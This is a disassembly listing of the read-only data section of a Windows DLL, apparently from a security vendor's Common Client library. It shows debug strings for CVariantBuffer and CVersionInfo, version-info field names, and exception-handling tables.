					; DATA XREF: Ordinal1518+Do
		align 4
; char aCvariantbuff_4[]
aCvariantbuff_4	db 'CVariantBuffer::GetBuffer() : SafeArrayAccessData() != S_OK, 0x%0'
					; DATA XREF: Ordinal1519+39o
		db '8X',0Ah,0
		align 10h
; char aCvariantbuff_3[]
aCvariantbuff_3	db 'CVariantBuffer::GetBuffer() : IsBuffer() == FALSE',0Ah,0
					; DATA XREF: Ordinal1519+10o
		align 8
; char aCvariantbuff_6[]
aCvariantbuff_6	db 'CVariantBuffer::ReleaseBuffer() : SafeArrayUnaccessData() != S_OK'
					; DATA XREF: Ordinal1520+2Do
		db ', 0x%08X',0Ah,0
		align 4
; char aCvariantbuff_5[]
aCvariantbuff_5	db 'CVariantBuffer::ReleaseBuffer() : IsBuffer() == FALSE',0Ah,0
					; DATA XREF: Ordinal1520+Co
		align 4
; char aCvariantbuff_8[]
aCvariantbuff_8	db 'CVariantBuffer::Create() : SafeArrayCreateVector() == NULL',0Ah,0
					; DATA XREF: Ordinal1504+2Ao
aCvariantbuff_7	db 'CVariantBuffer::Create() : dwSize == 0',0Ah,0
					; DATA XREF: Ordinal1504+Ao
; char aCvariantbuf_10[]
aCvariantbuf_10	db 'CVariantBuffer::Copy() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1507:loc_6AF51942o
		align 4
; char aCvariantbuff_9[]
aCvariantbuff_9	db 'CVariantBuffer::Copy() : VariantCopyInd() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1507+2Do
		align 4
; char aCvariantbuf_11[]
aCvariantbuf_11	db 'CVariantBuffer::Attach() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1509:loc_6AF51989o
		align 4
; char aCvariantbuf_14[]
aCvariantbuf_14	db 'CVariantBuffer::Read() : IsBuffer() == FALSE',0Ah,0
					; DATA XREF: Ordinal1514:loc_6AF519FDo
		align 4
aCvariantbuf_13	db 'CVariantBuffer::Read() : GetBuffer() == NULL',0Ah,0
					; DATA XREF: Ordinal1514+42o
		align 4
aCvariantbuf_12	db 'CVariantBuffer::Read() : dwBufferSize > dwSize',0Ah,0
					; DATA XREF: Ordinal1514+30o
; char aCvariantbuf_17[]
aCvariantbuf_17	db 'CVariantBuffer::Write() : IsBuffer() == FALSE',0Ah,0
					; DATA XREF: Ordinal1515:loc_6AF51A69o
		align 4
aCvariantbuf_16	db 'CVariantBuffer::Write() : GetBuffer() == NULL',0Ah,0
					; DATA XREF: Ordinal1515+37o
		align 4
aCvariantbuf_15	db 'CVariantBuffer::Write() : Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1515+25o
		align 4
; char aCvariantbuf_18[]
aCvariantbuf_18	db 'CVariantBuffer::CVariantBuffer() : Copy() == FALSE',0Ah,0
					; DATA XREF: Ordinal1498+25o
					; Ordinal1497+25o
; char aCvariantbuf_19[]
aCvariantbuf_19	db 'CVariantBuffer::operator =() : Copy() == FALSE',0Ah,0
					; DATA XREF: Ordinal1501+16o
					; Ordinal1500+16o
off_6AF6162C	dd offset aComments	; DATA XREF: Ordinal1525:loc_6AF51E52r
					; "Comments"
		dd offset aCompanyname	; "CompanyName"
		dd offset aFiledescriptio ; "FileDescription"
		dd offset aFileversion	; "FileVersion"
		dd offset aInternalname	; "InternalName"
		dd offset aLegalcopyright ; "LegalCopyright"
		dd offset aLegaltrademark ; "LegalTrademarks"
		dd offset aOriginalfilena ; "OriginalFilename"
		dd offset aProductname	; "ProductName"
		dd offset aProductversion ; "ProductVersion"
		dd offset aPrivatebuild	; "PrivateBuild"
		dd offset aSpecialbuild	; "SpecialBuild"
aSpecialbuild	db 'SpecialBuild',0     ; DATA XREF: .rdata:6AF61658o
		align 4
aPrivatebuild	db 'PrivateBuild',0     ; DATA XREF: .rdata:6AF61654o
		align 4
aProductversion	db 'ProductVersion',0   ; DATA XREF: .rdata:6AF61650o
		align 4
aProductname	db 'ProductName',0      ; DATA XREF: .rdata:6AF6164Co
aOriginalfilena	db 'OriginalFilename',0 ; DATA XREF: .rdata:6AF61648o
		align 4
aLegaltrademark	db 'LegalTrademarks',0  ; DATA XREF: .rdata:6AF61644o
aLegalcopyright	db 'LegalCopyright',0   ; DATA XREF: .rdata:6AF61640o
		align 4
aInternalname	db 'InternalName',0     ; DATA XREF: .rdata:6AF6163Co
		align 4
aFileversion	db 'FileVersion',0      ; DATA XREF: .rdata:6AF61638o
aFiledescriptio	db 'FileDescription',0  ; DATA XREF: .rdata:6AF61634o
aCompanyname	db 'CompanyName',0      ; DATA XREF: .rdata:6AF61630o
aComments	db 'Comments',0         ; DATA XREF: .rdata:off_6AF6162Co
		align 10h
; char aCversioninfoGe[]
aCversioninfoGe	db 'CVersionInfo::GetFieldName() : nIndex >= CCDIMOF(m_FieldInfo) || '
					; DATA XREF: Ordinal1540:loc_6AF51B9Fo
		db 'nIndex < 0',0Ah,0
		align 10h
; char aCversioninfo_0[]
aCversioninfo_0	db 'CVersionInfo::GetFieldValue() : nIndex >= CCDIMOF(m_FieldInfo) ||'
					; DATA XREF: Ordinal1541:loc_6AF51C03o
		db ' nIndex < 0',0Ah,0
		align 10h
off_6AF617B0	dd offset sub_6AF51C53	; DATA XREF: Ordinal1522o
					; Ordinal1521+Ao
off_6AF617B4	dd offset sub_6AF51CA3	; DATA XREF: Ordinal1524+7o
					; Ordinal1523+15o
; char aCversioninfo_1[]
aCversioninfo_1	db 'CVersionInfo::LoadBlock() : VerQueryValue() == 0',0Ah,0
					; DATA XREF: Ordinal1542:loc_6AF51D86o
		align 4
; char aStringfileinfo[]
aStringfileinfo	db '\StringFileInfo\%04x%04x\%s',0 ; DATA XREF: Ordinal1542+4Do
aCversioninfoLo	db 'CVersionInfo::LoadBlock()',0 ; DATA XREF: Ordinal1542+23o
		align 4
; char aCversioninfo_8[]
aCversioninfo_8	db 'CVersionInfo::Load() : VerQueryValue() == FALSE',0Ah,0
					; DATA XREF: Ordinal1525:loc_6AF51FC2o
		align 4
; char aCversioninfo_7[]
aCversioninfo_7	db 'CVersionInfo::Load() : (nSize / sizeof(LANGANDCODEPAGE)) <= 0',0Ah,0
					; DATA XREF: Ordinal1525:loc_6AF51FAEo
		align 4
; char aCversioninfo_6[]
aCversioninfo_6	db 'CVersionInfo::Load() : LoadBlock(%s) == FALSE',0Ah,0
					; DATA XREF: Ordinal1525+167o
		align 4
; char aVarfileinfoTra[]
aVarfileinfoTra	db '\VarFileInfo\Translation',0 ; DATA XREF: Ordinal1525+11Ao
		align 4
aCversioninfo_5	db 'CVersionInfo::Load() : GetFileVersionInfo() == FALSE',0Ah,0
					; DATA XREF: Ordinal1525+D5o
		align 4
; char aCversioninfo_4[]
aCversioninfo_4	db 'CVersionInfo::Load() : mem.NewAlloc() == NULL',0Ah,0
					; DATA XREF: Ordinal1525+AAo
		align 4
; char aCversioninfo_3[]
aCversioninfo_3	db 'CVersionInfo::Load() : GetFileVersionInfoSize() == 0',0Ah,0
					; DATA XREF: Ordinal1525+80o
		align 4
; char aCversioninfo_2[]
aCversioninfo_2	db 'CVersionInfo::Load() : path.SplitPath() == FALSE',0Ah,0
					; DATA XREF: Ordinal1525+51o
		align 10h
aAdvapi32_dll	db 'ADVAPI32.dll',0     ; DATA XREF: .rdata:6AF645DCo
aZ		db 'Z',0
		align 10h
; IID iidInterface
iidInterface	dd 20400h		; Data1	; DATA XREF: Ordinal381+104o
		dw 0			; Data2
		dw 0			; Data3
		db 0C0h, 6 dup(0), 46h	; Data4
; IID riid
riid		dd 146h			; Data1	; DATA XREF: Ordinal830+Co
		dw 0			; Data2
		dw 0			; Data3
		db 0C0h, 6 dup(0), 46h	; Data4
		dd 0B62F5910h, 11D16528h, 1196h, 0D0D1EF8h
dword_6AF61A00	dd 394C3DE0h, 11D23C6Fh, 0C0007B81h, 0B77A794Fh
					; DATA XREF: sub_6AF524A4+84o
off_6AF61A10	dd offset sub_6AF5256A	; DATA XREF: sub_6AF5254F+4o
					; sub_6AF5370A+Bo
		dd offset sub_6AF5257C
		dd offset sub_6AF52595
		dd offset sub_6AF525B8
		dd offset sub_6AF525CA
off_6AF61A24	dd offset sub_6AF5264B	; DATA XREF: sub_6AF525E6+9o
					; unknown_libname_14+8o ...
		dd offset ?Reset@EventWaitNode@details@Concurrency@@QAE_NXZ ; Concurrency::details::EventWaitNode::Reset(void)
		dd offset sub_6AF52685
		dd offset sub_6AF5261D
		dd offset sub_6AF5262B
		dd offset unknown_libname_14 ; Microsoft VisualC 2-10/net runtime
		align 10h
stru_6AF61A40	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF527AA, \
					; DATA XREF: _report_failure+2o
				   offset loc_6AF527AE>	; SEH scope table for function 6AF5278D
		dd offset dword_6AF61B94
off_6AF61A50	dd offset sub_6AF527CC	; DATA XREF: .data:stru_6AF68034o
					; .data:off_6AF68054o ...
		align 8
stru_6AF61A58	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF528BB, \
					; DATA XREF: __ArrayUnwind(void	*,uint,int,void	(*)(void *))+2o
				   offset loc_6AF528DF>	; SEH scope table for function 6AF5288C
		align 8
stru_6AF61A68	_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_6AF52932>
					; DATA XREF: unknown_libname_17+2o
					; SEH scope table for function 6AF528EA
		align 8
stru_6AF61A78	_SCOPETABLE_ENTRY <0FFFFFFFFh, 0, offset loc_6AF52994>
					; DATA XREF: unknown_libname_18+2o
					; SEH scope table for function 6AF5294A
		align 8
stru_6AF61A88	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF52B2C, \
					; DATA XREF: DllEntryPoint+2o
				   offset loc_6AF52B3D>	; SEH scope table for function 6AF52A6A
		align 8
stru_6AF61A98	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF52BFF, \
					; DATA XREF: sub_6AF52BD2+2o
				   offset loc_6AF52C03>	; SEH scope table for function 6AF52BD2
		align 8
stru_6AF61AA8	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF52C43, \
					; DATA XREF: sub_6AF52C16+2o
				   offset loc_6AF52C47>	; SEH scope table for function 6AF52C16
		dd offset dword_6AF61BD8
off_6AF61AB8	dd offset sub_6AF52D20	; DATA XREF: sub_6AF52C70+15o
					; sub_6AF52CB0+7o ...
		align 10h
__load_config_used dd 48h		; Size
		dd 0			; Time stamp
		dw 2 dup(0)		; Version: 0.0
		dd 0			; GlobalFlagsClear
		dd 0			; GlobalFlagsSet
		dd 0			; CriticalSectionDefaultTimeout
		dd 0			; DeCommitFreeBlockThreshold
		dd 0			; DeCommitTotalFreeThreshold
		dd 0			; LockPrefixTable
		dd 0			; MaximumAllocationSize
		dd 0			; VirtualMemoryThreshold
		dd 0			; ProcessAffinityMask
		dd 0			; ProcessHeapFlags
		dw 0			; CSDVersion
		dw 0			; Reserved1
		dd 0			; EditList
		dd offset ___security_cookie ; SecurityCookie
		dd offset ___safe_se_handler_table ; SEHandlerTable
		dd 6Ah			; SEHandlerCount
		dd 53445352h, 62F29301h, 4406C3B3h, 5F7219ADh, 0BCF63643h
		dd 1
aCBld_areaCcCom	db 'c:\bld_area\cc\Common_Client_302\src\r3.0.2\bin\bin.ira\ccL30.pdb'
		db 0
		align 4
off_6AF61B64	dd offset off_6AF68144	; DATA XREF: .rdata:off_6AF61B7Co
		align 10h
		dd 0FFFFFFFFh, 2 dup(0)
off_6AF61B7C	dd offset off_6AF61B64	; DATA XREF: .rdata:6AF61B90o
dword_6AF61B80	dd 3 dup(0)		; DATA XREF: .rdata:6AF61BA4o
		dd 1
		dd offset off_6AF61B7C
dword_6AF61B94	dd 3 dup(0)		; DATA XREF: .rdata:6AF61A4Co
		dd offset off_6AF68144
		dd offset dword_6AF61B80+4
off_6AF61BA8	dd offset off_6AF68118	; DATA XREF: .rdata:off_6AF61BC0o
		dd 2 dup(0)
		dd 0FFFFFFFFh, 2 dup(0)
off_6AF61BC0	dd offset off_6AF61BA8	; DATA XREF: .rdata:6AF61BD4o
		dd 0
		db    0			; DATA XREF: .rdata:6AF61BE8o
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		dd 1
		dd offset off_6AF61BC0
dword_6AF61BD8	dd 3 dup(0)		; DATA XREF: .rdata:6AF61AB4o
		dd offset off_6AF68118
		dd offset unk_6AF61BC8
		align 10h
___safe_se_handler_table dd rva	_except_handler3 ; DATA	XREF: .rdata:6AF61B00o
		dd rva unknown_libname_19 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_20 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_21 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_22 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_23 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_24 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_25 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_26 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_27 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_28 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_29 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_30 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_31 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_32 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_33 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_34 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_35 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_36 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_37 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_38 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_39 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_40 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_41 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_42 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_43 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_44 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_45 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_46 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_47 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_48 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_49 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_50 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_51 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_52 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_53 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_54 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_55 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_56 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_57 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_58 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_59 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_60 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_61 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_62 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_63 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_64 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_65 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_66 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_67 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_68 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_69 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_70 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_71 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_72 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_73 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_74 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_75 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_76 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_77 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_78 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_79 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_80 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_81 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_82 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_83 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_84 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_85 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_86 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_87 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_88 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_89 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_90 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_91 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_92 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_93 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_94 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_95 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_96 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_97 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_98 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_99 ; Microsoft VisualC 2-10/net runtime
		dd rva unknown_libname_100 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_101 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_102 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_103 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_104 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_105 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_106 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_107 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_108 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_109 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_110 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_111 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_112 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_113 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_114 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_115 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_116 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_117 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_118 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_119 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_120 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_121 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_122 ; Microsoft VisualC 2-10/net	runtime
		dd rva unknown_libname_123 ; Microsoft VisualC 2-10/net	runtime
		dd 0
dword_6AF61D9C	dd 2 dup(0)		; DATA XREF: sub_6AF52BD2+Co
					; sub_6AF52BD2:loc_6AF52BE5o
dword_6AF61DA4	dd 2 dup(0)		; DATA XREF: sub_6AF52C16+Co
					; sub_6AF52C16:loc_6AF52C29o ...
		dd offset stru_6AF68034
		dd 0
		dd 0FFFFFFFFh, 0
		dd 4, 0
dword_6AF61DC4	dd 1			; DATA XREF: .rdata:6AF61DD8o
		dd offset dword_6AF61DA4+4
dword_6AF61DCC	dd 3 dup(0)		; DATA XREF: sub_6AF3110D+9o
		dd offset dword_6AF61DC4
dword_6AF61DDC	dd 0FFFFFFFFh, 2 dup(0)	; DATA XREF: .rdata:6AF61E20o
		dd offset sub_6AF52D6C
dword_6AF61DEC	dd 0FFFFFFFFh, 4 dup(0)	; DATA XREF: .rdata:6AF61E14o
		dd offset sub_6AF31B9A
unk_6AF61E04	db    0			; DATA XREF: .rdata:6AF61E28o
		db    0
		db    0
		db    0
		dd 1, 2, 1
		dd offset dword_6AF61DEC+8
dword_6AF61E18	dd 19930520h, 3		; DATA XREF: unknown_libname_19o
		dd offset dword_6AF61DDC
		dd 1
		dd offset unk_6AF61E04
dword_6AF61E2C	dd 3 dup(0)		; DATA XREF: .rdata:6AF61E94o
					; .rdata:6AF61F18o ...
		dd offset off_6AF68054
		align 10h
		dd 0FFFFFFFFh, 0
		dd 0Ch
		dd offset ??0exception@@QAE@ABV0@@Z ; exception::exception(exception const &)
dword_6AF61E50	dd 0			; DATA XREF: .rdata:6AF61E90o
					; .rdata:6AF61F14o
		dd offset off_6AF6806C
		dd 0
		dd 0FFFFFFFFh, 0
		dd 28h
		dd offset sub_6AF31E35
unk_6AF61E6C	db    0			; DATA XREF: .rdata:6AF61E8Co
		db    0
		db    0
		db    0
		dd offset off_6AF6808C
		align 8
		dd 0FFFFFFFFh, 0
		dd 28h
		dd offset sub_6AF31E7A
dword_6AF61E88	dd 3			; DATA XREF: .rdata:6AF61EA4o
		dd offset unk_6AF61E6C
		dd offset dword_6AF61E50
		dd offset dword_6AF61E2C+8
dword_6AF61E98	dd 0			; DATA XREF: sub_6AF31CCD+39o
					; sub_6AF333E4+2Bo ...
		dd offset sub_6AF3142B
		dd 0
		dd offset dword_6AF61E88
stru_6AF61EA8	_msExcInfo <-1,	offset sub_6AF52D84> ; DATA XREF: .rdata:stru_6AF61EB0o
stru_6AF61EB0	_msExcept7 <19930520h, 1, offset stru_6AF61EA8,	0, 0, 0>
					; DATA XREF: unknown_libname_20o
stru_6AF61ECC	_msExcInfo <-1,	offset sub_6AF52D97> ; DATA XREF: .rdata:stru_6AF61ED4o
stru_6AF61ED4	_msExcept7 <19930520h, 1, offset stru_6AF61ECC,	0, 0, 0>
					; DATA XREF: unknown_libname_21o
		dd 0			; DATA XREF: .rdata:6AF61F10o
		dd offset off_6AF680AC
		dd 0
		dd 0FFFFFFFFh, 0
		dd 28h
		dd offset sub_6AF32123
dword_6AF61F0C	dd 3			; DATA XREF: .rdata:6AF61F28o
		dd offset dword_6AF61EF0
		dd offset dword_6AF61E50
		dd offset dword_6AF61E2C+8
dword_6AF61F1C	dd 0			; DATA XREF: sub_6AF31E92+3Ao
					; sub_6AF33387+2Bo ...
		dd offset sub_6AF31452
		align 8
		dd offset dword_6AF61F0C
stru_6AF61F2C	_msExcInfo <-1,	offset sub_6AF52DAA> ; DATA XREF: .rdata:stru_6AF61F34o
stru_6AF61F34	_msExcept7 <19930520h, 1, offset stru_6AF61F2C,	0, 0, 0>
					; DATA XREF: unknown_libname_22o
dword_6AF61F50	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF61FB4o
		dd offset sub_6AF52DBD
		dd 0
		dd offset sub_6AF52DC5
		dd 1
		dd offset sub_6AF52DD0
		dd 2, 0
		dd 2, 0
dword_6AF61F78	dd 8			; DATA XREF: .rdata:6AF61FA8o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF323EF
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF32432
dword_6AF61F98	dd 2 dup(3), 4,	2	; DATA XREF: .rdata:6AF61FBCo
		dd offset dword_6AF61F78
dword_6AF61FAC	dd 19930520h, 5		; DATA XREF: unknown_libname_23o
		dd offset dword_6AF61F50
		dd 1
		dd offset dword_6AF61F98
		dd 2 dup(0)
dword_6AF61FC8	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF6201Co
		dd offset sub_6AF52DE2
		dd 4 dup(0)
dword_6AF61FE0	dd 8			; DATA XREF: .rdata:6AF62010o
		dd offset off_6AF680CC
		dd 0FFFFFFB4h
		dd offset sub_6AF32572
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB8h
		dd offset sub_6AF325B5
dword_6AF62000	dd 2 dup(1), 2 dup(2)	; DATA XREF: .rdata:6AF62024o
		dd offset dword_6AF61FE0
dword_6AF62014	dd 19930520h, 3		; DATA XREF: unknown_libname_24o
		dd offset dword_6AF61FC8
		dd 1
		dd offset dword_6AF62000
		align 10h
stru_6AF62030	_msExcInfo <-1,	offset sub_6AF52DF4> ; DATA XREF: .rdata:stru_6AF62038o
stru_6AF62038	_msExcept7 <19930520h, 1, offset stru_6AF62030,	0, 0, 0>
					; DATA XREF: unknown_libname_25o
stru_6AF62054	_msExcInfo <-1,	offset sub_6AF52E06> ; DATA XREF: .rdata:stru_6AF6205Co
stru_6AF6205C	_msExcept7 <19930520h, 1, offset stru_6AF62054,	0, 0, 0>
					; DATA XREF: unknown_libname_26o
dword_6AF62078	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF620F4o
		dd offset sub_6AF52E18
		dd 0
		dd offset sub_6AF52E23
		dd 1
		dd offset sub_6AF52E2E
		dd 2
		dd offset sub_6AF52E39
		dd 3
		dd offset sub_6AF52E44
		dd 4, 0
		dd 5
		dd offset sub_6AF52E4F
		dd 4, 0
dword_6AF620B8	dd 8			; DATA XREF: .rdata:6AF620E8o
		dd offset off_6AF680CC
		dd 0FFFFFE84h
		dd offset loc_6AF3302E
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFE80h
		dd offset loc_6AF33080
dword_6AF620D8	dd 5, 6, 7, 2		; DATA XREF: .rdata:6AF620FCo
		dd offset dword_6AF620B8
dword_6AF620EC	dd 19930520h, 8		; DATA XREF: unknown_libname_27o
		dd offset dword_6AF62078
		dd 1
		dd offset dword_6AF620D8
		dd 2 dup(0)
stru_6AF62108	_msExcInfo <-1,	offset sub_6AF52E64> ; DATA XREF: .rdata:stru_6AF62110o
stru_6AF62110	_msExcept7 <19930520h, 1, offset stru_6AF62108,	0, 0, 0>
					; DATA XREF: unknown_libname_28o
stru_6AF6212C	_msExcInfo <-1,	offset sub_6AF52E79> ; DATA XREF: .rdata:stru_6AF62134o
stru_6AF62134	_msExcept7 <19930520h, 1, offset stru_6AF6212C,	0, 0, 0>
					; DATA XREF: unknown_libname_29o
stru_6AF62150	_msExcInfo 4 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF621B8o
stru_6AF62170	_msRttiDscr <0,	0, 0, offset loc_6AF33D0C>
					; DATA XREF: .rdata:stru_6AF62190o
stru_6AF62180	_msRttiDscr <0,	0, 0, offset loc_6AF33E08>
					; DATA XREF: .rdata:stru_6AF62190o
stru_6AF62190	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF621B8o
		dd 1			; Count
		dd offset stru_6AF62170	; RttiBlkPtr
		dd 2, 2, 3		; _unk
		dd 1			; Count
		dd offset stru_6AF62180	; RttiBlkPtr
stru_6AF621B8	_msExcept7 <19930520h, 4, offset stru_6AF62150,	2, \
					; DATA XREF: unknown_libname_30o
			    offset stru_6AF62190, 0>
stru_6AF621D4	_msExcInfo 4 dup(<-1, 0>) ; DATA XREF: .rdata:stru_6AF6223Co
stru_6AF621F4	_msRttiDscr <0,	0, 0, offset loc_6AF33FA3>
					; DATA XREF: .rdata:stru_6AF62214o
stru_6AF62204	_msRttiDscr <0,	0, 0, offset loc_6AF34099>
					; DATA XREF: .rdata:stru_6AF62214o
stru_6AF62214	dd 0, 0, 1		; _unk ; DATA XREF: .rdata:stru_6AF6223Co
		dd 1			; Count
		dd offset stru_6AF621F4	; RttiBlkPtr
		dd 2, 2, 3		; _unk
		dd 1			; Count
		dd offset stru_6AF62204	; RttiBlkPtr
stru_6AF6223C	_msExcept7 <19930520h, 4, offset stru_6AF621D4,	2, \
					; DATA XREF: unknown_libname_31o
			    offset stru_6AF62214, 0>
dword_6AF62258	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF622B4o
		dd offset sub_6AF52EA0
		dd 2 dup(0)
		dd 1
		dd offset sub_6AF52EA8
		dd 2 dup(0)
dword_6AF62278	dd 8			; DATA XREF: .rdata:6AF622A8o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF34219
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF3425C
dword_6AF62298	dd 1, 2, 3, 2		; DATA XREF: .rdata:6AF622BCo
		dd offset dword_6AF62278
dword_6AF622AC	dd 19930520h, 4		; DATA XREF: unknown_libname_32o
		dd offset dword_6AF62258
		dd 1
		dd offset dword_6AF62298
		dd 2 dup(0)
stru_6AF622C8	_msExcInfo <-1,	offset sub_6AF52EBD> ; DATA XREF: .rdata:stru_6AF622D0o
stru_6AF622D0	_msExcept7 <19930520h, 1, offset stru_6AF622C8,	0, 0, 0>
					; DATA XREF: unknown_libname_33o
dword_6AF622EC	dd 0FFFFFFFFh		; DATA XREF: .rdata:6AF62340o
		dd offset sub_6AF52ECF
		dd 4 dup(0)
dword_6AF62304	dd 8			; DATA XREF: .rdata:6AF62334o
		dd offset off_6AF680CC
		dd 0FFFFFFB0h
		dd offset loc_6AF34980
		dd 8
		dd offset stru_6AF68034
		dd 0FFFFFFB4h
		dd offset loc_6AF349C3
